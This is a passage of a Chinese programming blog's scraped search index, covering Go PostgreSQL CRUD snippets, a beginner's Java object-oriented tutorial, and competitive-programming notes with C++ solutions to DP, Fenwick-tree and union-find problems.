db.Exec(\"insert into test (name, password) values ($1, $2)\", myname, mypassword)//向test表中添加一行，其中name和password列的值为myname和mypassword if err != nil{ //检查错误 } _, err = db.Exec(\"update test set password = $1 where name = $2\", newpassword, myname)//更新test表中name为myname的行，令password等于newpassword if err != nil{ //检查错误 }","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:3","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"删除\r_, err = db.Exec(\"delete from test where name = $1\", myname)//删除test表中name为myname的行 _, err = db.Exec(\"drop table test\")//删除test表 _, err = db.Exec(\"alter table table_name drop column column_name;\")//删除table_name表中名为column_name的列 ","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:4","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"创建表\r_, err = db.Exec(\"create table if not exists test(name text, password text)\")//创建test表如果不存在的话，有两个列分别是name和password _, err = db.Exec(\"alter table table_name add column_name datatype;\")//向table_name表添加数据类型为datatype的列名为column_name ","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:5","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["工程"],"content":"模糊查找\rrows, err := db.Query(\"select * from tesst where name ilike $1\", myname) // 使用like模糊查找，ilike表示不分大小写 当myname = chen%时表示查找所有name前缀中有chen的行 当myname = %chen%时表示查找所有name中包含chen的行，如mychen, mychenmy","date":"2024-06-11","objectID":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/:2:6","tags":["Go"],"title":"Go连接pgsql数据库","uri":"/posts/go%E8%BF%9E%E6%8E%A5postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["语言"],"content":"【从0开始学JAVA】 类个，我的对象在哪里？\r由于本人是从C开始学习的编程菜鸟，虽然接触过一点cpp(对现在的我来说也许只是c + stl库？只是为了写算法题方便一些…)，所以我打算先学JAVA的特点和思想————面向对象编程。 （至于安装JAVA可以看我*兄弟的博客*) ","date":"2024-06-11","objectID":"/posts/java-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/:0:0","tags":["JAVA"],"title":"JAVA面向对象","uri":"/posts/java-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"categories":["语言"],"content":"类个，总而言之，先给自己NEW一个对象吧\r面向对象 面向对象(Object Oriented)是软件开发方法，一种编程范式。面向对象的概念和应用已超越了程序设计和软件开发，扩展到如数据库系统、交互式界面、应用结构、应用平台、分布式系统、网络管理结构、CAD技术、人工智能等领域。面向对象是一种对现实世界理解和抽象的方法，是计算机编程技术发展到一定阶段后的产物。\r面向对象是相对于面向过程来讲的，面向对象方法，把相关的数据和方法组织为一个整体来看待，从更高的层次来进行系统建模，更贴近事物的自然运行模式。————来自*百度百科; 面向对象有三大基本特征： 封装 继承 多态 面向对象的编程思想就是把事物看作一个整体，从事物的特征（属性）和行为（方法）两个方面进行描述。 面向对象是找对象、创建对象、使用对象、维护对象的关系的过程 类 和 对象是什么？ 抛开对象不谈，我还是有对象的。类(Class) 是具有相同特性（数据元素）和行为（功能）的对象的抽象。 定义类：就是定义类的成员，包括成员变量和成员方法 类的成员: 成员属性：对象事物的属性； 成员方法：对象事物的方法(捏造对象的方法，处理对象行为的方法等等) 该类对象中每一个对象都具有类的成员属性，都可以使用类的成员方法。 有点类似C语言中的结构体，成员属性就是结构体中函数的变量，成员方法就是结构体中包含的函数，而每一个对象都是一个结构体。 public class 类名{ //成员变量 //成员方法 } struct human { int age；//成员变量 int (*)sleep()//成员方法 }对象(Object) 的含义是指具体的某一个事物，即在现实生活中能够看得见摸得着的事物。 在JAVA这类静态语言中，类是对象的抽象，对象是类的实例化。 创建对象 类名 对象名 = new 类名() 调用对象 对象名.成员变量\r对象名.方法(参数列表) 面向对象的编程方法，首先我们要找到对象，思考对象具有什么属性，然后创建一个对象。 public class human { int age; String name; public human() { // 没有参数的构造方法 // 构造对象的方法，方法名与类名要相同 name = \"李华\"; age = 18; }// 构造一个名为李华，年龄为18岁的对象 public human(String human_name, int human_age) { // 有参数的构造方法 this.name = human_name; this.age = human_age; // this代表它所在方法所属对象的引用。哪个对象调用的this所在的方法，this就代表哪个对象。当然this还有其他作用 }// 构造一个名为human_name,年龄为human_age的对象 /* * public huamn(){ * this(\"李华\",18); * //this在构造方法第一行时且带有参数列表，则代表引用了该类下其他的捏造方法(根据参数列表选择)； * } */ public void sleep(int time) { System.out.println(this.name + \"睡了\" + time + \"小时\"); } public static class new_human extends human {// 子类继承父类 静态的main不能调用动态类中的方法，所以要在类前加static才能在main中调用这个类，构造子类的对象 int tail;// 子类自己的变量 public new_human() {// 构造子类对象 super();// super关键字，引用父类的变量、方法 } public new_human(String human_name, int age) { super(human_name, age); } public new_human(String human_name, int age, int tail) { this.name = human_name; this.age = age; this.tail = tail; }// 子类自己的构造方法 } public static void main(String[] args) { human first = new human(); human second = new human(\"小明\", 18); System.out.println(\"名字:\" + first.name + \" 年龄:\" + first.age); System.out.println(\"名字:\" + second.name + \" 年龄:\" + second.age); first.sleep(8); second.sleep(7); new_human third = new new_human(); new_human fourth = new new_human(\"张三\", 18); new_human fifth = new new_human(\"李四\", 20, 186); System.out.println(\"名字:\" + third.name + \" 年龄:\" + third.age); System.out.println(\"名字:\" + fourth.name + \" 年龄:\" + fourth.age); System.out.println(\"名字:\" + fifth.name + \" 年龄:\" + fifth.age + \"身高(cm):\" + fifth.tail); } } 输出结果： 名字:李华 年龄:18 名字:小明 年龄:18 李华睡了8小时 小明睡了7小时 名字:李华 年龄:18 名字:张三 年龄:18 名字:李四 年龄:20身高(cm):186 super关键字： 表示当前类的父类的引用 只能出现在有继承关系的子类中 super两种用法： super.属性名、super.方法名(参数列表) 表示父类的属性和方法，和子类中的属性或方法重名时使用 super(参数列表) 出现在子类构造方法的第一句代码时 就是通过参数列表匹配父类的构造方法来创建父类对象 ##面向对象的三大基本特性： 封装 封装是将代码及其处理的数据绑定在一起的一种编程机制，该机制保证了程序和数据都不受外部干扰且不被误用。 封装的目的在于保护信息，保证数据的安全性 封装包括两个方面：属性的封装和方法的封装 Java 提供了私有和公有的访问模式，类的公有接口代表外部的用户应该知道或可以知道的每件东西，私有的方法数据只能通过该类的成员代码来访问， 封装不是绝对的封装，如果想要访问封装起来的数据，可以通过指定的入口即可 属性和方法的封装两者时相辅相成、密不可分的 继承 程序中的继承性是指子类拥有父类的全部特征和行为，这是类之间的一种关系。 继承的特点： 继承要有一定的层次结构，而且还要具备一定的可传递性 子类继承了父类的所有属性和方法，但是不包括私有属性（private）和构造方法 子类继承父类的属性和方法同时也可以有自己的属性和方法。 Java 只支持单继承。 也就是说一个子类只能有一个父类，父类可以有多个子类 继承可以减少重复代码、提高了复用性和维护性 继承让类与类之间产生了关系，类的耦合性增强了，父类发生变化子类也会跟着改变 多态 多态就是同一函数在不同类中有不同的实现； 面向对象的多态性，即“一个接口，多个方法”。 多态性体现在父类中定义的属性和方法被子类继承后，可以具有不同的属性或表现方式。 //在子类中修改父类方法，实现同一接口不同方法，如 father.sleep() son.sleep()同一个sleep接口，但根据不同父、子类出现不同结果 多态性允许一个接口被多个同类使用，弥补了单继承的不足。 ","date":"2024-06-11","objectID":"/posts/java-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/:1:0","tags":["JAVA"],"title":"JAVA面向对象","uri":"/posts/java-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"categories":["ICPC"],"content":"DP\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"D-圆_牛客练习赛122 )\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"3077. K 个不相交子数组的最大能量值\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:2","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"F-三途川的摆渡人_牛客周赛 Round 37 (nowcoder.com)\r代码：\r#include\u003cbits/stdc++.h\u003e using namespace std; void solve() { int n; cin \u003e\u003e n; vector\u003cint\u003e a(n); for (auto \u0026i : a) cin \u003e\u003e i; sort(a.begin(), a.end()); a.erase(unique(a.begin(), a.end()), a.end()); vector\u003carray\u003cint, 2\u003e\u003e dp(210,{1000000000, 1000000000}); for (int i = 0; i \u003c (int)a.size(); i ++) { dp[a[i]][1] = 1; for (int j = 0; j \u003c= 200; j ++) { dp[j \u0026 a[i]][1] = min(dp[j \u0026 a[i]][1], dp[j][0] + 1); } for (int j = 0; j \u003c= 200; j ++) dp[j][0] = dp[j][1]; } if (dp[0][0] \u003e n) cout \u003c\u003c -1 \u003c\u003c endl; else cout \u003c\u003c n - dp[0][0] \u003c\u003c endl; } int main(){ int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:3","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"E - Minimize Sum of Distances (atcoder.jp)\r思路\r换根DP(时间复杂度、换相邻节点为根后f值变化的规律) dfs计算每个子树的C之和，以及以1为root的树的f值。 从1开始dfs换根，换根i之后的f值为f(fa) - sumC(i) + (sumC[1] - sumC[i]) Code\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; const int N = 100010; ll h[N], e[N\u003c\u003c1], ne[N \u003c\u003c 1], idx, c[N]; ll sumC[N]; ll sum = 0; ll ans = 1e18; void add(int a,int b){ e[++idx] = b; ne[idx] = h[a]; h[a] = idx; } void dfs(int pos, int fa, ll cnt){ sumC[pos] = c[pos]; sum += cnt * c[pos]; for(int i = h[pos]; i != -1; i = ne[i]){ int j = e[i]; if(j == fa) continue; dfs(j, pos, cnt + 1); sumC[pos] += sumC[j]; } } void dfs1(int pos, int fa, ll temp){ ll tmp = temp - sumC[pos] + sumC[1] - sumC[pos]; ans = min(ans, tmp); for(int i = h[pos]; i != -1; i = ne[i]){ int j = e[i]; if(j == fa) continue; dfs1(j, pos, tmp); } } void solve(){ int n; cin \u003e\u003e n; for(int i = 0; i \u003c n - 1; i++){ int a, b; cin \u003e\u003e a \u003e\u003e b; add(a, b), add(b, a); } for(int i = 1; i \u003c= n; i++) cin \u003e\u003e c[i]; dfs(1,0,0); ans = sum; for(int i = h[1]; i!= -1; i = ne[i]){ dfs1(e[i],1, sum); } cout \u003c\u003c ans \u003c\u003c '\\n'; } int main() { memset(h, -1, sizeof h); ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:4","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"E-来硬的 01背包\rcode:\r#include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll x[1000010], y[1000010]; ll dp[1000010][2]; int main(){ ll n, m; cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e x[i] \u003e\u003e y[i]; memset(dp, 0x3f, sizeof dp); dp[0][0] = 0; for(int i = 1; i \u003c= n; i++){ for(int j = m - 1; j \u003e= 0; j--){ dp[min(j + x[i], m)][0] = min(dp[min(j + x[i], m)][0], dp[j][0] + y[i]); dp[min(j + x[i], m)][1] = min(dp[min(j + x[i], m)][1], dp[j][1] + y[i]); dp[min(j + 2 * x[i], m)][1] = min(dp[min(j + x[i] * 2, m)][1], dp[j][0] + y[i] / 2); } } cout \u003c\u003c min(dp[m][0], dp[m][1]); return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:5","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"E - Toward 0 求期望\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:6","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"2024 湖北省赛 Problem - H 状态压缩DP\r思路：\r用十位四进制数表示鱼塘中剩下的鱼，每一位是一个块内剩下的鱼，将(sum)4 变为(0)4。 枚举5*k个位置投放i枚炸弹后的状态转移 在i,j位置放x枚炸弹，使得五个位置中减少的鱼的数量的状态位四进制数(x)4 枚举当前所有的状态，对每一个状态和这个四进制数进行check，每一个四进制位取两者的最小值（能够改变的状态）得到一个新的四进制数tmp，并记录实际有效的炸弹数量cnt，则状态转移方程为dp[key - tmp] = min(dp[key - tmp], dp[key] + cnt); 最后答案即为dp[0] code:\r#include \u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll mp[1010][1010]; ll dx[] = {0, 0,1,0,-1}; ll dy[] = {0,1,0,-1,0}; ll pos[1010][1010]; ll st[1010][1010]; ll idx = 0; ll dp[2000010]; ll pow4[20]; ll num = 0; ll check(ll a, ll b){ ll res = 0; num = 0; ll cnt = 0; while(b){ ll f1 = a % 4; ll f2 = b % 4; res += pow4[cnt] * min(f1, f2); num = max(num, min(f1, f2));//实际生效的炸弹数量 b /= 4; a /= 4; cnt++; } return res; //a状态-res后转移到新状态 } void solve(){ set\u003cll\u003e all; ll n, m, k; scanf(\"%lld%lld%lld\", \u0026n, \u0026m, \u0026k); ll mx = 0; for(int i = 1; i \u003c= n; i++) for(int j = 1; j \u003c= m; j++) pos[i][j] = -1; vector\u003cpair\u003cint, int\u003e\u003e f; for(int i = 1; i \u003c= k; i++){ ll x, y, a; scanf(\"%lld%lld%lld\", \u0026x, \u0026y, \u0026a); mp[x][y] = a; mx += pow4[idx] * a; pos[x][y] = idx++;//每一个有鱼的块对于四进制数中的一位 for(int q = 0; q \u003c 5; q++){ ll xx = x + dx[q], yy = y + dy[q]; if(xx \u003c 1 || xx \u003e n || yy \u003c 1 || yy \u003e m) continue; f.push_back({xx,yy}); } } for(int i = 0; i \u003c= mx; ++i) dp[i] = 0x3f; dp[mx] = 0; all.insert(mx); for(auto [x,y]:f){//枚举每一个可以投掷炸弹的位置 if(st[x][y]) continue;//重叠的区域 st[x][y] = 1; for(ll i = 1; i \u003c= 3; i++){ ll boom = 0; for(ll q = 0; q \u003c 5; q++){ ll xx = x + dx[q]; ll yy = y + dy[q]; if(xx \u003c 1 || xx \u003e n || yy \u003c 1 || yy \u003e m) continue; if(pos[xx][yy] \u003e -1){ boom += pow4[pos[xx][yy]] * i; } } for(auto key:all){//枚举所有状态 ll tmp1 = check(key, boom); if(tmp1 \u003e key) continue; dp[key - tmp1] = min(dp[key - tmp1], dp[key] + num); all.insert(key - tmp1);//添加新状态 } } } printf(\"%lld\\n\", dp[0]); } int main() { pow4[0] = 1; for(int i = 1; i \u003c= 11; i++){ pow4[i] = pow4[i - 1] * 4;//4的幂次 } int t; t = 1; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:7","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"Problem - H 多重背包 二进制优化\r思路\r构造两个数组，使两数组按照以下规则操作后构成给定的序列P： 1.两数组都为空，则停止操作 2.任意一个数组为空，将另一个非空数组的首个元素弹出并放到P序列的末尾 3.两数组都不空，将两数组首个元素中较小的元素弹出并放到P序列末尾 性质： 1.在P序列中，假设第i位为x，则在x之后直到第一个比x大的数出现，中间的数都和x绑定在同一个侧数组中。如5 1 2 3 6，5、1、2、3都必须在同一侧的数组中，且顺序固定。 2.在考虑性质1后，P序列按照顺序分为了若干个不可分割的小块，要想成功构造P序列，需要用这若干的小块按照相对次序将两个数组填满，此时不需要关注每个小块内部的数了，只需要关注小块的长度。所有小块长度和为2n，所以只需要填满一个长为n的数组即可。则转变为背包问题，考虑m个物品能否装满一个容量为n的背包，每个物品可能有多个，为多重背包模型，使用二进制优化。 code\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; int p[500010]; void solve(){ unordered_map\u003cint, int\u003e mp; int n; cin \u003e\u003e n; vector\u003cint\u003e dp(n / 2 + 1, 0); dp[0] = 1; int pos = 0; for(int i = 1; i \u003c= n; i++) { cin \u003e\u003e p[i]; if(p[i] == n) pos = i; } if(pos \u003c= n / 2){ cout \u003c\u003c \"No\" \u003c\u003c '\\n'; return; } int mx = 0; for(int i = 1; i \u003c= n / 2; i++){ mx = max(mx, p[i]); } if(p[n / 2 + 1] \u003e mx) { cout \u003c\u003c \"Yes\" \u003c\u003c '\\n'; return; } int l = 1; for(int i = 2; i \u003c= n; i++){ if(p[i] \u003e p[l]){ mp[i - l]++; l = i; } } mp[n + 1 - l]++; for(auto [k, v]: mp){ vector\u003cint\u003e f; for(int i = 1; i \u003c= v; i *= 2){ if(v \u003e= i){ f.push_back(i); v -= i; }else{ break; } } if(v \u003e 0) f.push_back(v); for(int i = 0; i \u003c f.size() ; i++){ for(int j = n / 2; j \u003e= k * f[i]; j--){ if(dp[j - k * f[i]]) dp[j] = 1; } } } if(dp[n / 2]) cout \u003c\u003c \"Yes\" \u003c\u003c '\\n'; else cout \u003c\u003c \"No\" \u003c\u003c '\\n'; } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:8","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"DS\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:0","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"F - Second Largest Query\r","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:1","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"F-小红的好子串询问 树状数组 子串变形\r思路\r首先需要推出一个结论，即当只有三个字符时，要时字符串中不存在回文串，那么这个字符串必然是一个由r、e、d组成的循环串（6种，red、rde、erd、edr、dre、der） 所以一个字符串要变成没有回文串的条件就是成为循环串，最小修改次数就是在6种情况下取最小值。 首先预处理一遍6种状态，用前缀和维护从1到i修改为循环串所需要的更改次数，子串[i,j]的修改次数即为sum[j] - sum[i - 1] 如果不考虑修改，只考虑查询，这道题就已经结束了。 如果考虑修改，则需要使用树状数组维护前缀和数组，优化区间修改。假设修改第i个字符，那么会改变[i,n]的前缀和的值，使用树状数组维护可以将O(n)的复杂度优化为O(log2n)。 使用前缀和数组的差分数组建立树状数组，再使用单点修改和单点查询即可 code\rstring a[6] = {\"red\", \"rde\", \"erd\", \"edr\", \"dre\", \"der\"}; int dp[6][100010]; class treeset{ public: int n; ll tree[100010]; treeset(int x){ this-\u003en = x; for(int i = 0; i \u003c= x; i++) this-\u003etree[i] = 0; } int lowbit(int x){return x \u0026 -x;} void add(int x, ll val){ for(int i = x; i \u003c= n; i += lowbit(i)) tree[i] += val; } ll query(int x) { ll sum = 0; for(int i = x; i \u003e= 1; i -= lowbit(i)) sum += tree[i]; return sum; } ll queryLR(int l, int r) { ll sum1 = 0, sum2 = 0; for(int i = l - 1; i \u003e= 1; i -= lowbit(i)) sum1 += tree[i]; for(int i = r; i \u003e= 1; i -= lowbit(i)) sum2 += tree[i]; return sum2 - sum1; } void update(int l, int r, ll val){ for(int i = l; i \u003c= n; i += lowbit(i)) tree[i] += val; for(int i = r + 1; i \u003c= n; i += lowbit(i)) tree[i] -= val; }; ll querypoint(int x){ ll ret = 0; for(int i = x; i \u003e= 1; i -= lowbit(i)) ret += tree[i]; return ret; } }; void solve(){ int n, m; cin \u003e\u003e n \u003e\u003e m; string s; cin \u003e\u003e s; s = \"?\" + s; for(int i = 0; i \u003c 6; i++) for(int j = 1; j \u003c= n; j++){ dp[i][j] = dp[i][j - 1] + (a[i][j % 3] != s[j]); } vector\u003ctreeset\u003e ans; for(int i = 0; i \u003c 6; i++){ ans.push_back(treeset(n)); for(int j = 1; j \u003c= n; j++){ ans[i].add(j, dp[i][j] - dp[i][j - 1]); } } while(m--){ int op; cin \u003e\u003e op; if(op == 1){ int x; char ch; cin \u003e\u003e x \u003e\u003e ch; int tmp = s[x]; if(ch != tmp){ int l = x; x %= 3; for(int i = 0; i \u003c 6; i++){ if(a[i][x] == tmp){ ans[i].update(l, n, 1); }else if(a[i][x] == ch){ ans[i].update(l, n, -1); } } s[l] = ch; } }else{ int l, r; cin \u003e\u003e l \u003e\u003e r; ll ret = 1e9; for(int i = 0; i \u003c 6; i++) ret = min(ret, ans[i].querypoint(r) - ans[i].querypoint(l - 1)); cout \u003c\u003c ret \u003c\u003c '\\n'; } } }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:2","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"E-小A的任务_堆\r思路\rn个A任务、B任务 先做A任务再做B任务。完成k个b任务的最小值显然等于min(前i个a的和 + 前i个b中最小的k个)枚举i从k到n 用大根堆维护k个b，每次检验新的b是否比堆顶小，若小则弹出并更新ans。 code\r#include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; int main(){ ll n, q; cin \u003e\u003e n \u003e\u003e q; vector\u003cll\u003e a(n + 1), b(n + 1); vector\u003cll\u003e sum(n + 1); for(int i = 1; i \u003c= n; i++){ cin \u003e\u003e a[i]; sum[i] = sum[i - 1] + a[i]; } for(int i = 1; i \u003c= n; i++) cin \u003e\u003e b[i]; while(q--){ int k; cin \u003e\u003e k; priority_queue\u003cll, vector\u003cll\u003e, less\u003cll\u003e\u003e que; ll temp = 0; for(int i = 1; i \u003c= k; i++){ temp += b[i]; que.push(b[i]); } ll ans = sum[k] + temp; for(int i = k + 1; i \u003c= n; i++){ if(que.top() \u003e b[i]){ temp -= que.top(); temp += b[i]; que.pop(); que.push(b[i]); ans = min(ans, sum[i] + temp); } } cout \u003c\u003c ans \u003c\u003c '\\n'; } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:3","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"P10179 水影若深蓝 并查集\r思路\r判断连通性，使用并查集。 将所有m并在一起，说明这个连通块每个点到fa的距离都为2。 若合并完后只有一个连通块且n!=1，显然为No，因为没有到fa距离为1的点 否则，任选两个连通块A、B，将faA、faB连起来，sonA与faB相连，sonB与其他点与faA相连。此时满足条件 代码\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; struct node{ int u, v; }f[300010]; int fa[300010]; int find(int x){ if(fa[x] != x){ fa[x] = find(fa[x]); } return fa[x]; } void solve(){ int n, m; cin \u003e\u003e n \u003e\u003e m; for(int i = 1; i \u003c= n; i++) fa[i] = i; for(int i = 1; i \u003c= m; i++){ cin \u003e\u003e f[i].u \u003e\u003e f[i].v; int x = find(f[i].u), y = find(f[i].v); fa[x] = y; } int cnt = 0, center[2]; for(int i = 1; i \u003c= n; i++){ if(find(i) == i){ if(cnt \u003c 2) center[cnt] = i; cnt++; } } if(cnt == 1 \u0026\u0026 n == 1){ cout \u003c\u003c \"Yes\" \u003c\u003c '\\n'; return; } if(cnt == 1 \u0026\u0026 n \u003e 1){ cout \u003c\u003c \"No\" \u003c\u003c '\\n'; return; } cout \u003c\u003c \"Yes\" \u003c\u003c '\\n'; cout \u003c\u003c center[0] \u003c\u003c ' ' \u003c\u003c center[1] \u003c\u003c '\\n'; for(int i = 1; i \u003c= n; i++){ if(i == center[0] || i == center[1]) continue; if(find(i) == center[0]) cout \u003c\u003c i \u003c\u003c ' ' \u003c\u003c center[1] \u003c\u003c '\\n'; else cout \u003c\u003c i \u003c\u003c ' ' \u003c\u003c center[0] \u003c\u003c '\\n'; } } int main() { ios::sync_with_stdio(false); cin.tie(0), cout.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:4","tags":["ICPC"],"title":"笔记（持续更新）","uri":"/posts/%E7%AC%94%E8%AE%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["ICPC"],"content":"P10180 半彩三重奏 可撤销并查集\r题意\r思路\r题解\rcode\r#include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; const int N = 1e6 + 10; ll fa[N], siz[N], cor[N]; ll find(ll x){ if(fa[x] != x){ fa[x] = find(fa[x]); } return fa[x]; } void add(ll x, ll y){ int fx = find(x), fy = find(y); if(fx == fy) return; fa[fy] = fx; siz[fx] += siz[fy]; } unordered_map\u003cll, ll\u003e mp; vector\u003cpair\u003cll, ll\u003e \u003e g[N]; ll cnt = 0; struct node{ ll x, y; }e[N]; int find1(ll x){ if(fa[x] == x) return x; return find1(fa[x]); } stack\u003cll\u003e stk1; stack\u003cpair\u003cll,ll\u003e\u003e stk2; void merge(int x, int y){ int xx = find1(x), yy = find1(y); if(siz[xx] \u003e siz[yy]) swap(xx, yy); stk1.push(xx); stk2.emplace(yy, siz[yy]); fa[xx] = yy; siz[yy] += siz[xx]; } void undo(){ fa[stk1.top()] = stk1.top(); stk1.pop(); siz[stk2.top().first] = stk2.top().second; stk2.pop(); } ll inans[N], stans[N]; void solve(){ ll n, k; cin \u003e\u003e n \u003e\u003e k; for(ll i = 1; i \u003c= n; i++) cin \u003e\u003e cor[i], fa[i] = i, siz[i] = 1; for(ll i = 2; i \u003c= n; i++){ cin \u003e\u003e e[i].x; e[i].y = i; if(cor[e[i].x] == cor[e[i].y]){ add(e[i].x, e[i].y); }else{ ll tmp; if(cor[e[i].x] \u003c cor[e[i].y]) tmp = 